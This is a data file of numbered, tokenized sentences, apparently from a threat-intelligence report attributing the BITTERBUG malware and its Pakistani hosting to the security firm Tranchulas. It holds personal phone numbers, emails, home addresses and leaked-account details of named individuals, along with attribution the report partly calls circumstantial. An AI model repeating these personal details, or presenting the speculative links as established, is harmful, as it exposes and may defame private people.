"7078": "In one case , an actor appeared to manually null out the '' Cert-India '' user directory in one of the file paths ( see figures 15 and 16 below ) contained in two binaries ( support components ) .", "7079": "These files shared the same import hash ( 4e96e86db5a8a025b996aefdc218ff74 ) and were virtually the same files minus modification to a few bytes in the second sample .", "7080": "As these samples point to , we also observed use of the C++ Boost libraries , which introduced a new file path to monitor for operational security purposes .", "7081": "We observed at least one case in which files mixed old and new file paths , as seen in the figures 17 and 18 below .", "7082": "In both cases , it is possible that the actors intentionally did this in an attempt to mislead further research efforts into post-blog samples or cast suspicion on '' Cert-India '' as a more-revealing element .", "7083": "For example , analysis of files deployed alongside the nulled-out '' Cert-India '' sample mentioned above revealed a lack of concern over the same string .", "7084": "Alternatively , these inconsistencies could also indicate sloppy tradecraft and/or teamwork .", "7085": "BITTERBUG Hashes BITTERBUG and Support Component Debug Strings ( in order of first use ) BITTERBUG Import Hashes HTTP Requests BITTERBUG Domain & IPs The Kansas-City-based hosting provider sent an introductory email message on July 24th , 2013 at 1500 CDT and would be received by TCIRT at 1400 EDT and VPSNOC on Thursday July 25th , 2013 at 1200 PKT .", "7086": "Analysis of the VPSNOC email header indicated that the message was sent on Thursday 25 July at 02:28:41 +0500 GMT , which is consistent with Pakistan 's time zone .", "7087": "Of note , the email message was sent with an X-Originating IP Address of 184.75.214.10 corresponding to a Private Internet Access Canadian proxy .", "7088": "VPSNOC 's use of this commercial proxy service likely demonstrates the intent to mask the apparent origin of the sender .", "7089": "These two examples highlight that VPSNOC 's inbound and outbound email communications consistently utilized a +0500 Pakistani timezone .", "7090": "Due to the apparent Pakistani nexus within the BITTERBUG malware and the Pakistan time zone consistently observed within the VPSNOC emails , the TCIRT applied additional scrutiny and research of the content within the Tranchulas '' Response ThreatConnect.docx '' to validate their claims .", "7091": "In the following section we will examine the inconsistencies observed .", "7092": "Within the response we observed the following inconsistencies : Our review of the '' ResponseThreatConnect.docx '' focused in on the email screenshot ( Figure 3 ) image1.png that Khan provided revealing that the date probably had been modified to appear as though they were the first to notify VPSNOC .", "7093": "Within the official response , Zubair Khan indicated that Tranchulas was '' already aware of this incident ...", "7094": "and contacted hosting company .", "7095": "'' The official response included a screenshot depicting an email sent to VPSNOC from an unidentified ( redacted ) tranchulas.com email address that was sent on '' Tue , Jul 21 , 2013 at 11:36 PM '' with no evidence of the date in which it was received by or responded to by VPSNOC .", "7096": "This message contained a notable misalignment between the date and day of the week .", "7097": "July 21 , 2013 was a Sunday , not a Tuesday .", "7098": "'' Tuesday '' would have pre-dated our official notification that occurred on Wednesday July 24 , 2013 , and could indicate that Tranchulas may have obtained insight into the original TCIRT notification through Pakistan- based contacts within VPSNOC .", "7099": "The TCIRT subsequently responded to Mr. Khan 's official explanation with a follow-up inquiry , offering Khan an opportunity to explain the date inconsistency within the email screenshot .", "7100": "Mr. Khan deferred our request to Mr. Hamza Qamar , a Penetration Testing Team Lead at Tranchulas , who later responded with a simple denial that the email message had not been altered apart from blurring the name of the original sender .", "7101": "The email screenshot ( image1.png ) from within the Tranchulas response demonstrated awareness of information that we initially withheld and later released in our blog post : one malware variant that contained a debug string with '' umairaziz27 '' the same username as a Tranchulas employee .", "7102": "The Tranchulas message to VPSNOC incorrectly claimed to identify malware on 199.91.173.43 that contained the '' company 's name and ...", "7103": "employee 's name '' .", "7104": "While it is possible that Tranchulas ' analysts discovered this variant independent of the blog post , it added to the inconsistent elements of the response and further suggested that the blog post may have inspired its communications with VPSNOC .", "7105": "We note that we requested additional information such as the '' detailed analysis report '' within the exchange from Tranchulas but did not receive a response .", "7106": "The Tranchulas response indicates that '' Tranchulas ' research team was already aware of this incident before publication of this report .", "7107": "Our team contacted hosting company of server to seek an explanation .", "7108": "'' Considering there are no public references to the identified infrastructure identifying VPSNOC as the '' hosting company '' .", "7109": "The only way for Tranchulas to identify VPSNOC as the hosting company was to either have previous insider knowledge of the activity , or to have been privately introduced by the Kansas-City-based service provider to their '' client '' VPSNOC , of which was never mentioned or discussed when we initially exchanged with either the Kansas-City or Pakistan-based hosting providers .", "7110": "Public registration of the 199.91.173.43 reveals the Kansas-City-based hosting provider as the official registrant and owner of the infrastructure .", "7111": "The only way to know that VPSNOC was subleasing the infrastructure was to obtain this information directly from them .", "7112": "There was no public reference which would have revealed VPSNOC as the entity which maintained root access to the 199.91.173.43 .", "7113": "Had Tranchulas legitimately conducted an initial victim notification sometime in late July 2013 , they would have likely done so through the Kansas-City-based hosting provider and not VPSNOC .", "7114": "On August 15 , 2013 , Hamza Qamar 's response to TCIRT 's follow up inquiry to the observed inconsistencies redirected TCIRT personnel to VPSNOC to obtain an explanation versus attempting to explain the observed day date inconsistency and document properties within the Tranchulas email .", "7115": "The TCIRT 's suspicion mounted when presenting Tranchulas with the opportunity to set the record straight , that Tranchulas could not substantiate their claims , rather deferring the TCIRT inquiry to a third party ( VPSNOC ) .", "7116": "Within the '' ResponseThreatConnect.docx '' the image '' image1.png '' contains an undated response from VPSNOC to the '' Tue , Jul 21 , 2013 '' Tranchulas notification .", "7117": "The undated VPSNOC response that Tranchulas received is nearly identical to the response that TCIRT and the Kansas-City-based service provider obtained on July 24th .", "7118": "Tranchulas does not include the date or time as to when they obtained a response from VPSNOC .", "7119": "The TCIRT found it unusual that neither the Kansas-City-based service provider or VPSNOC personnel ever indicated either way that they knew about the activity or had been previously contacted by either party .", "7120": "When considering all of the inconsistencies , order of events and studying , Gmail webmail layout , similarities of keywords , salutations and closings within the '' Tue , Jul 21 , 2013 '' Tranchulas notification and the respective VPSNOC response .", "7121": "The TCIRT grew increasingly suspicious of the exchanges with VPSNOC and subsequent exchanges with Tranchulas personnel .", "7122": "In reviewing the document metadata within the '' ResponseThreatConnect.docx '' that was sent from Mr. Zubair Khan on August 6 , 2013 , the TCIRT also identified that this document maintained the creator properties of '' hp .", "7123": "'' ( Figure 10 ) While the author field of '' hp '' does n't conclusively prove a relationship , it contributes to a body of circumstantial evidence which matches the document properties of the official Tranchulas response to the document properties that were also found within decoy documents that were bundled with BITTERBUG implants .", "7124": "According to the vpsnoc.com website '' In 2007 five VPS experts decided to invest in their very own private rack space in the heart of Kansas , the United States .", "7125": "Their aim ? To bring service-oriented , quality managed and unmanaged VPS solutions to clients all over the world .", "7126": "Just 1 year later , after beginning their enterprise on 3 servers they had filled 2 server racks with happy clients receiving quality U.S support .", "7127": "Their company continued to build momentum .", "7128": "'' Whois records for vpsnoc.com indicate that another individual registered the domain and listed Digital Linx Hosting as the registrant organization with a Kansas City-based address , telephone number 925-665-1427 , and administrative email address admin @ digitallinx .", "7129": "org .", "7130": "This is the same registrant record for the digitallinx.net domain .", "7131": "The digitallinx.net/sitemap.xml and the corresponding Google cache for digitallinx.net/sitemap.xml indiciate that both digitallinx.net and digitallinx.com have shared the same sitemap.xml at the same time .", "7132": "The digitallinx.net/Contact.html identified similar overlaps with data across the .org", "7133": ", .net", "7134": ", and .com", "7135": "domains .", "7136": "The domain digitallinx.com is registered to Perasona # 1 .", "7137": "He uses email addresses naseer @ digitallinx.com and nbhatti @ gmail.com as the domain registrant email address , along with address 638-F Johar Town , Lahore Pakistan and telephone 966.548805579 .", "7138": "The DigitalLinx ( digitallinx.com ) website states that it is '' a web hosting / Web Solutions & Processing Outsourcing Company based in Pakistan '' .", "7139": "Open source research of the phone number 925-665-1427 indicates that it is also used within site content as a phone number for defiantmarketing.com .", "7140": "This domain is registered by Persona # 2 who uses the aliases '' agnosticon '' and '' agnostic '' .", "7141": "Persona # 2 lists VPSNOC as the registrant organization , and uses the registration email address of abunasar @ yahoo.com with an address of House 12 , Street 21 , F-8/1 Islamabad Federal 44000 .", "7142": "The domain defiantmarketing.com domain has used ns1.abunasar.net and ns2.abunasar.net for name services .", "7143": "Within a January 2009 posting to a Debian users forum , Persona # 2 sends an email from the abunasar @ yahoo.com with a reply-to as abunasar @ army.com .", "7144": "Within the post , Persona # 2 responds to the question '' Who 's using Debian '' listing DigitalLinx , Kansas City MO and the link to digitallinx.com .", "7145": "Also , the seemingly abandoned Twitter profile for Persona # 2 is only following the Twitter profile for @ VPSNOC .", "7146": "In an April 2012 post to blackhatworld.com , a user with the alias '' agnosticon '' posted promotional codes for VPSNOC hosting services , engaging with customers , providing them feedback regarding VPS services and thanking them for positive reviews .", "7147": "Within the posting the user '' agnosticon '' included an image which was an actual advertisement that was hosted at http : //vpsnoc .", "7148": "com/order.png .", "7149": "Within the posted image it states '' VPSNOC is a subdivision of Digital Linx Hosting .", "7150": "We have been in business since 2008 '' .", "7151": "The posting concludes with '' If you have any further questions/queries please contact us directly at : support @ vpsnoc.com '' Muhammad Naseer Bhatti 's LinkedIn profile indicates that he is currently the founder for Digital Linx LLC and vBilling ( vbilling.org ) as well as a consultant for a U.S. company .", "7152": "Both Bhatti and Digital Linx are listed as the registrants for vbilling.org , v-billing .", "7153": "com , vgriffins.com and my-server.co , which use P.O .", "7154": "Box 295658 , Riyadh Saudi Arabia as the registration address .", "7155": "This is also the address for two U.S. companies ' local operations .", "7156": "Bhatti is also listed as the owner of the netblock 46.4.139.224/28 .", "7157": "Both passive DNS sources as well as Robtex highlight this overlapping infrastructure .", "7158": "From September 7 - 9 , 2011 , Tranchulas in cooperation with the Pakistan National University of Sciences and Technology ( NUST ) , offered a Certified Penetration Testing Profession ( CPTP ) Workshop ( Figure 17 ) .", "7159": "During the workshop , basic penetration techniques and skills were presented .", "7160": "It is likely that CPTP workshops and alignment with NUST have allowed Tranchulas the opportunity to recruit student interns .", "7161": "Within the CPTP event registration contact information for Muhammad Naseer was listed next to a Tranchulas office number ( 051- 2871433 ) .", "7162": "It is important to note that Muhammad Naseer Bhatti has been previously known to drop the family name '' Bhatti '' within online correspondence ( Figure 18 ) .", "7163": "In a June 2012 episode of Engineering and Technology Magazine podcast a Mohammed Nasser , Penetration Tester at Tranchulas was interviewed .", "7164": "A Mohammed Nasser may also be directly affiliated with Tranchulas .", "7165": "This links Tranchulas to a Pakistani employee or consultant also named Muhammad Naseer .", "7166": "It is unknown if this is the same Muhammad Naseer that is associated with VPSNOC 's parent company Digital Linx , the Pakistan-based service provider which hosted the original BITTERBUG malware .", "7167": "Abunasar Khan also maintains the aliases '' agnosticon '' and '' agnostic '' in addition to the email addresses abunasar @ yahoo .", "7168": "com and abunasar @ army.com .", "7169": "He has been previously associatedwith VPSNOC & Digital Linx .", "7170": "An April 2012 Whois registrant record for the domain zeusadnetwork.com includes the first and last name Khan along with the same ( 925 ) 665-1427 phone number seen within the Digial Linx Hosting domains .", "7171": "Khan registered a variety of domains , many of which use his abunasar.net for name services and abunasar.yahoo.com within the Start of Authority ( SOA ) records .", "7172": "For example a July 2014 record ( Figure 19 ) for defiantmarketing.com and an August 2013 record ( Figure 20 ) for ns2.vpsnoc.com both maintain these references .", "7173": "Abunasar Khan registered abunasar.net and previously ( May 2007 ) and maintained whitehate.org , which have both been used to demonstrate an affinity for and alignment with AntiSec and Anonymous movements .", "7174": "The abunasar.net website prominently displays ascii art of the term '' antisec '' with antisec related content '' Blend in .", "7175": "Get trusted .", "7176": "Trust nobody .", "7177": "Own everybody .", "7178": "Disclose nothing .", "7179": "Destroy everything .", "7180": "Take back the scene .", "7181": "'' This is a shared affinity that is also reflected amongst with the culture of Tranchulas employees .", "7182": "The pure.whitehate.org domain has also been previously associated with Khan , examples can be found within # phrack and # darknet IRC sessions .", "7183": "Ironically , in February 2011 , Khan 's Rootkit.com user profile was compromised revealing his profile 's username , password hash , email ( abunasar @ army.com ) , and the registration IP address of 202.125.143.67 ( Islamabad , Pakistan ) .", "7184": "During his registration , Khan specified the name '' anony mo us '' when registering the profile .", "7185": "As of 16 August 2013 , a Pastebin post contained details of a customer database compromise for nowclothing.pk , which included Khan 's name , email abunasar @ army.com , and cell phone number 03215488881 .", "7186": "Research of the 03215488881 cell phone number yields a user profile '' abunasark '' in an April 2009 posting .", "7187": "Khan posts pictures of his blue Baleno and includes another phone number 03234764838 .", "7188": "In a secondary profile user '' Ak '' uses the same cell phone number 03215488881 in a 2009 sales posting for a 2004 blue Baleno .", "7189": "Khan 's affinity for Suzuki Baleno cars is made obvious in a May 2009 registration for clubaleno.co.uk that was registered by Khan at VPSNOC using the name services of ns1.abunasar.net and ns2.abunasar.net with a SOA record of abunasar.yahoo.com .", "7190": "Later in a June 2009 posting , Khan using the alias '' agnostic '' attempts to sell the domain clubaleno.co.uk and uses his abunasar @ army.com email address as a point of contact .", "7191": "Khan is also observed using the alias '' agnosticon '' and a Toyota Racing Development avitar within posts to blackhatworld.com and again within a 2011 post where he posts a cpanel error that also includes his '' abunasar '' username within system output .", "7192": "The Google+ profile for Khan reveals established social network links to a Team Lead for Penetration Testing at Tranchulas and a Digital Linx employee Shoaib Riaz who also maintains a social network association with the Digital Linx founder Muhammad Nasser Bhatti .", "7193": "The Tranchulas website states that they provide a range of security services and training to include penetration and offensive cyber initiative ( OCI ) , in which they '' help national level cyber security programs on strategies for managing offensive technical threats '' .", "7194": "In a September 2011 YouTube user '' tranchulascert '' posted a video titled '' Tranchulas Cyber Ranges - P @ sha ICT Awards 2011 '' , where they awarded runner up .", "7195": "Within the video , the cyber ranges were referenced as being developed for '' defense forces '' that were aimed to '' help them in developing offensive and defensive warfare skills '' and '' combating anti-state hackers '' .", "7196": "Although Tranchulas brands itself as a multi-national company , their respective operating addresses within United Kingdom the United States and New Zealand are all associated with either virtual office spaces or address forwarding services .", "7197": "The Tranchulas website lists its Pakistan address within the 2nd floor of the Evacuee Trust Complex on Sir Agha Khan Road F-5/1 Islamabad 44000 .", "7198": "The Evacuee Trust Complex is also known as Software Technology Park 2 or STP2 and hosts a variety of other commercial and government offices .", "7199": "The Tranchulas employee , Hamza Qamar , that handled the response to our inquiry has a public LinkedIn profile that states that he '' Engaged in system and enterprise level network and Web application security testing for clients ranging from large federal agencies , DoD , and commercial clients .", "7200": "'' The profile does not specify if DoD is a reference to the U.S. Department of Defense or another country 's Ministry of Defense .", "7201": "Interestingly , Qamar 's Google+ page showed one '' friend '' in his circle despite more than 40 followers , Abunasar Khan a VPSNOC employee .", "7202": "It is likely that Tranchulas provides services to the Pakistani government .", "7203": "The offensive cyber initiative services offered by Tranchulas is offered to '' national-level cyber security programs '' suggesting a commercial demand from '' national-level '' customers .", "7204": "The stated purpose and intent of the Tranchulas '' Cyber Ranges '' P @ sha ICT 2011 awards video suggests the ranges were specifically developed in support of national interests for offensive and defensive purposes .", "7205": "The domain registration by Zubair Khan using an official Pakistani government address with his zubair @ tranchulas.com email address indicates that Khan may have or currently maintains a physical address at a location where other Pakistani government officials reside .", "7206": "Historic Whois registration records for the domains textcrypter.com , taggnation.com , bookadoconline.com and saadiakhan .", "7207": "net lists Tranchulas CEO Zubair Khan ( zubair @ tranchulas.com ) as the registrant for the domains .", "7208": "At the time of registration Khan used the address 15-B , Mehran Block of the Gulshan-e-Jinnah F-5/1 Islamabad Pakistan for the domains .", "7209": "In an April 2008 Request for Proposals , the Pakistan Public Works Department issued a tender for the Constriction of Government Servant Quarters and Garages at Gulshan-e-Jinnah Complex F-5/1 Islamabad .", "7210": "Later in May of 2010 within a Pakistani Senate question and answer session , the Gulshan-e-Jinnah Complex was cited under Federal Lodges / Hostels in Islamabad under the control of Pakistan Ministry for Housing and Works .", "7211": "A December 2010 TheNews Pakistan ran a story that detailed the differential in rents between commoners within Islamabad and Pakistani government officers accommodated at Gulshan-e-Jinnah .", "7212": "According to Google Maps it is approximately 650 meters ( 8 minute walk ) from the Gulshan-e-Jinnah Complex to the Tranchulas offices within the Evacuee Trust Complex .", "7213": "Within a May 2013 interview Khan specified that he comes from a family with a strong military background .", "7214": "He detailed his interest in '' the world of hacking '' grew during his teen years , referencing his father 's diplomatic assignment to the Philippines in 2003 .", "7215": "Khan would go on to establish Tranchulas in February 2006 after an independent audit of Pakistani Governments National Database and Registration Authority ( NADRA ) .", "7216": "Digital Appendix 1 contains additional research collateral collected when conducting Operation Arachnophobia research .", "7217": "Digital Appendix 2 contains raw email communications .", "7218": "These .eml", "7219": "files include raw SMTP headers , content and attachments .", "7220": "Digital Appendix 3 contains screenshots of web content used to conduct analysis .", "7221": "Digital Appendix 4 contains visualization files that depict relationships and contain metadata associated with our Operation Arachnophobia research ."}